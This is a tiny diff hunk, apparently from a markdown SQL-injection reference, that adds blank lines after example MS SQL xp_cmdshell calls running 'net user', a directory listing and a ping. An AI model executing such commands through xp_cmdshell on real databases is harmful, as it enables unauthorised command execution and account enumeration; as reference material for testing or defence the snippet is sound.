@@ -16,3 +16,5 @@ EXEC xp_cmdshell "net user";
 EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
 EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
 ```
+
+
